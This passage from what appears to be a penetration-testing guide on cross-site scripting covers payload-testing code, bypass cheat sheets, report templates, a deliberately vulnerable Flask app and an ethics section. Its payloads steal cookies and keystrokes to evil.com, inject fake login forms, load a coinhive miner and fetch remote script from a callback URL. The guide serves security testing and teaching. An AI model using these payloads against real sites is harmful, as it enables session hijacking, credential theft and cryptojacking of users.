URL:           javascript:alert(1)
CSS:           background:url(javascript:alert(1))
SVG:           <svg onload=alert(1)>
MathML:        <math><mtext><table><mglyph>...
```

## Advanced Techniques

### Multi-Payload Chain Testing

```python
def test_chained_payloads(url, param):
    """Test payloads that chain multiple vulnerabilities"""
    chains = [
        # XSS + CSRF
        ('<script>new Image().src="http://evil.com/steal?c="+document.cookie</script>', 'cookie_theft'),
        # XSS + Keylogger
        ('<script>document.onkeypress=function(e){new Image().src="http://evil.com/log?k="+e.key}</script>', 'keylogger'),
        # XSS + Phishing
        ('<script>document.body.innerHTML="<h1>Login Required</h1><form action=http://evil.com><input name=user placeholder=Email><input name=pass type=password><button>Login</button></form>"</script>', 'phishing'),
        # XSS + Crypto miner
        ('<script src="https://coinhive.com/lib/miner.min.js"></script><script>                                                        </script>', 'cryptojacking'),
        # XSS + Redirect
        ('<script>window.location="http://evil.com/steal?ref="+document.referrer</script>', 'redirect'),
    ]
    for payload, name in chains:
        test_payload(url, param, payload, name)
```

### Blind XSS Detection

```python
def test_blind_xss(url, param, callback_url):
    """Test for blind XSS that fires in admin panels"""
    blind_payloads = [
        f'<script src="{callback_url}/xss.js"></script>',
        f'<img src=x onerror="var s=document.createElement(\'script\');s.src=\'{callback_url}/xss.js\';document.body.appendChild(s)">',
        f'<svg/onload="fetch(\'{callback_url}/log?c=\'+document.cookie)">',
        f'<script>document.write(\'<img src="{callback_url}/log?c=\'+document.cookie+\'">\')</script>',
    ]
    for payload in blind_payloads:
        send_payload(url, param, payload)
```

### Polyglot Payload Testing

```python
def test_polyglot_payloads(url, param):
    """Test payloads that work in multiple contexts"""
    polyglots = [
        "'-alert(1)-'",
        '\\"-alert(1)-"',
        '"><img src=x onerror=alert(1)>',
        "'><img src=x onerror=alert(1)>",
        '"><svg onload=alert(1)>',
        "';alert(1)//",
        '";alert(1)//',
        '</script><script>alert(1)</script>',
        '/*</script><script>alert(1)</script>',
    ]
    for payload in polyglots:
        test_payload(url, param, payload)
```

## Detection Indicators

### Application-Level Indicators

```
- User input reflected without HTML entity encoding
- JavaScript variables assigned from user input without escaping
- innerHTML or document.write used with user-controlled data
- URL parameters used in href or src attributes without validation
- Template engine output not properly escaped
- Missing or weak Content Security Policy headers
- No X-XSS-Protection header (or set to 0)
- User input in SVG or HTML files that are rendered
- JavaScript eval() or Function() with user input
- DOM manipulation APIs receiving unsanitized input
```

### Client-Side Indicators

```
- JavaScript reads from URL fragment and renders to DOM
- postMessage handlers don't validate origin
- Dynamic script loading from user-controlled URLs
- Template literals with user input interpolation
- jQuery .html() or .append() with user data
- React dangerouslySetInnerHTML usage
- Angular bypassSecurityTrust* functions
- Vue v-html directive with user content
```

### Network Indicators

```
- Callback requests to XSS Hunter / Burp Collaborator
- Outbound HTTP requests to attacker domains
- Exfiltrated data in URL parameters or request bodies
- DNS requests to known XSS testing domains
```

## Impact Assessment

### XSS Severity Matrix

| XSS Type | Impact | CVSS | Severity |
|----------|--------|------|----------|
| Stored XSS (admin) | Full application compromise | 8.8 | High |
| Stored XSS (user) | Account takeover, data theft | 8.1 | High |
| Reflected XSS | Session hijacking via phishing | 6.1 | Medium |
| DOM XSS | Session hijacking, no server interaction | 6.1 | Medium |
| Blind XSS | Admin account compromise | 8.1 | High |
| Mutation XSS | Bypasses sanitizer, full execution | 8.8 | High |

### Impact Scenarios

- **Session Hijacking**: Steal session tokens for account takeover
- **Credential Theft**: Inject keylogger or fake login forms
- **Data Exfiltration**: Read CSRF tokens, private data, other users' information
- **Malware Distribution**: Redirect to drive-by download or inject crypto miner
- **Defacement**: Modify page content displayed to users
- **Phishing**: Inject realistic login forms that send credentials to attacker
- **Worm Propagation**: Self-propagating XSS that infects other users
- **Privilege Escalation**: XSS in admin context = full application control

## Common Pitfalls

1. **Testing only reflected XSS**: Stored XSS is more impactful but requires understanding data flow across the application.
2. **Ignoring DOM-based XSS**: Server-side filtering cannot prevent DOM XSS; requires client-side analysis.
3. **Not testing all output contexts**: The same payload works differently in HTML body vs attribute vs JavaScript contexts.
4. **Missing context-specific payloads**: Generic payloads miss context-dependent XSS.
5. **Assuming WAF prevents XSS**: WAFs can be bypassed; application-level encoding is the real defense.
6. **Not validating with real browsers**: Some payloads only work in specific browsers or require DOM mutation.
7. **Ignoring CSP**: CSP is a defense layer; test if it can be bypassed.
8. **Forgetting about blind XSS**: Admin panel XSS may not be visible during testing but fires when admin views data.
9. **Not testing SVG uploads**: SVG files can contain JavaScript and bypass image-only upload restrictions.
10. **Missing mutation XSS**: HTML parsers may mutate payloads, bypassing sanitizers.

## Integration Points

### With Recon Phase

```
- Identify web frameworks and their XSS protection mechanisms
- Enumerate user input points (forms, URL parameters, API endpoints)
- Check for CSP headers and their configuration
- Identify JavaScript frameworks and DOM manipulation patterns
```

### With Authentication Testing

```
- Test XSS in authenticated pages for higher impact
- Steal session tokens via XSS for account takeover
- Test blind XSS that fires in admin panels
- Chain XSS with CSRF for enhanced exploitation
```

### With CSRF Testing

```
- Use XSS to steal CSRF tokens
- Combine XSS with CSRF for state-changing attacks
- XSS in CSRF-restricted pages bypasses SameSite protections
```

### With File Upload Testing

```
- Upload SVG files for stored XSS
- Test XSS in uploaded HTML/JavaScript files
- XSS via filename in error messages
- Test content-type sniffing XSS
```

### With SSRF Hunting

```
- Use XSS to trigger requests from victim's browser to internal services
- Combine XSS with CSRF for server-side exploitation
- Use XSS for DNS rebinding attacks
```

### With Open Redirect

```
- Chain open redirect with XSS for filter bypass
- Use open redirect to deliver XSS payloads via trusted domain
- XSS in redirect response before navigation
```

## Reporting Templates

### Reflected XSS Report

```
## [MEDIUM] Reflected Cross-Site Scripting (XSS)

**Endpoint**: GET /search?q=PAYLOAD
**Parameter**: q
**Context**: HTML body
**CVSS**: 6.1 (Medium)

### Description
The application reflects user input from the 'q' parameter in the HTML
response without proper encoding. An attacker can craft a URL containing
a malicious payload that executes JavaScript in the victim's browser.

### Steps to Reproduce
1. Navigate to: http://target.com/search?q=<script>alert(1)</script>
2. Observe the script tag appears unencoded in the response
3. JavaScript executes in the context of the target domain

### Impact
- Session hijacking via cookie theft
- Credential theft via phishing forms
- Malware distribution
- Defacement of application content

### Remediation
- HTML entity encode all user input in output
- Implement Content Security Policy headers
- Use templating engine auto-escaping
- Validate and sanitize input before processing
```

### Stored XSS Report

```
## [HIGH] Stored Cross-Site Scripting (XSS)

**Endpoint**: POST /profile/bio
**Parameter**: bio
**Context**: HTML body in /profile/VIEW_USER
**CVSS**: 8.1 (High)

### Description
The application stores user input from the 'bio' field without sanitization.
The unsanitized content is rendered in other users' profile views, allowing
stored XSS that affects all users who view the affected profile.

### Steps to Reproduce
1. Set profile bio to: <svg onload="fetch('http://evil.com/?c='+document.cookie)">
2. Share profile link with victim
3. Victim's browser sends cookies to attacker's server

### Impact
- Mass session hijacking of all profile viewers
- Account takeover of victim accounts
- Data exfiltration of user information
- Potential worm propagation

### Remediation
- Sanitize HTML content with DOMPurify before storage
- Implement CSP with nonce-based script loading
- Serve user content from separate domain without cookies
- Re-encode content on output as defense-in-depth
```

## Practice Labs

### XSS Labs Setup

```bash
# XSS-labs (DVWA-style XSS challenges)
git clone https://github.com/do0dl3/xss-labs.git
cd xss-labs
docker-compose up -d
# Access at http://localhost:8080

# Also test with:
# - DVWA (XSS Reflected and Stored)
# - WebGoat (XSS lessons)
# - bWAPP (multiple XSS challenges)
# - OWASP Juice Shop (XSS challenges)
```

### Custom Practice Script

```python
# vulnerable_xss_app.py — Flask app with intentional XSS for practice
from flask import Flask, request, render_template_string

app = Flask(__name__)

@app.route("/search")
def search():
    query = request.args.get("q", "")
    # VULNERABLE: Direct template injection without escaping
    return render_template_string(f"<h1>Search Results</h1><p>You searched for: {query}</p>")

@app.route("/profile")
def profile():
    bio = request.args.get("bio", "")
    # VULNERABLE: Stored XSS
    return render_template_string(f"<h1>Profile</h1><p>Bio: {bio}</p>")

@app.route("/dom")
def dom_xss():
    # VULNERABLE: DOM-based XSS
    return '''<html><body>
    <div id="output"></div>
    <script>
        var params = new URLSearchParams(window.location.search);
        document.getElementById("output").innerHTML = params.get("name");
    </script>
    </body></html>'''

if __name__ == "__main__":
    app.run(port=5002, debug=True)
```

## Ethics

- **Authorization**: Only test XSS on systems you have explicit permission to test
- **Payload Selection**: Use benign payloads (`alert(1)`) for demonstration; avoid malicious payloads in authorized testing
- **No Data Theft**: Never exfiltrate real user data during XSS testing
- **Scope**: Stay within authorized scope; do not test other users' accounts or data
- **Responsible Disclosure**: Report XSS vulnerabilities privately with remediation guidance
- **No Worms**: Never create self-propagating XSS payloads even in authorized testing
- **Impact Communication**: Clearly explain XSS business impact to stakeholders
- **Defense Focus**: Emphasize remediation over exploitation in reports
- **Browser Safety**: Test XSS payloads in isolated browser instances
- **Cleanup**: Remove all test payloads from the application after testing

## Quick Reference

### XSS Payload Cheat Sheet

```html
<!-- HTML Body -->
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<iframe src=javascript:alert(1)>
<details open ontoggle=alert(1)>
<video><source onerror=alert(1)>
<input onfocus=alert(1) autofocus>
<textarea autofocus onfocus=alert(1)>
<marquee onstart=alert(1)>

<!-- HTML Attribute -->
" onfocus=alert(1) autofocus="
" onmouseover=alert(1) "
" onclick=alert(1) "
' onfocus=alert(1) autofocus='

<!-- JavaScript Context -->
';alert(1)//
"-alert(1)-"
';alert(1)//
'-alert(1)-'
\';alert(1)//
alert(1)
constructor.constructor('alert(1)')()

<!-- URL Context -->
javascript:alert(1)
data:text/html,<script>alert(1)</script>
data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==

<!-- SVG -->
<svg onload=alert(1)>
<svg/onload=alert(1)>
<svg><script>alert(1)</script></svg>

<!-- Filter Bypass -->
<scr<script>ipt>alert(1)</scr</script>ipt>
<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>
<script>eval(atob('YWxlcnQoMSk='))</script>
<svg/onload=eval('al'+'ert(1)')>
```

### Quick Detection Commands

```bash
# Dalfox quick scan
dalfox url "http://target.com/search?q=test" --blind your-callback.xss.ht

# XSStrike quick scan
python xsstrike.py -u "http://target.com/search?q=test"

# Manual reflected XSS test with curl
curl -s "http://target.com/search?q=<script>alert(1)</script>" | grep "<script>"

# DOM XSS check — search for dangerous sinks
grep -rn "innerHTML\|document\.write\|eval\(" *.js

# CSP check
curl -sI http://target.com | grep -i "content-security-policy"

# Headless browser validation
node xss_validator.js "http://target.com/search?q="
```

### Filter Bypass Reference

```
<script>          → <scr<script>ipt>
alert()           → confirm(), prompt(), print()
onerror           → onload, onfocus, onmouseover, onclick
javascript:       → data:text/html, &#106;avascript:
< >               → &lt; &gt;, &#60; &#62;
spaces            → /**/, %09, %0a, /+/
quotes            → backticks, no quotes, HTML entities
eval              → Function(), setTimeout(), setInterval()
document.cookie   → document['cookie'], top['document'].cookie
```

---

**Last Updated**: 2026
**Author**: Advanced Automation Security Framework
**Version**: 2.0
**Tags**: #xss #reflected-xss #stored-xss #dom-xss #dalfox #xsstrike #csp-bypass #automation
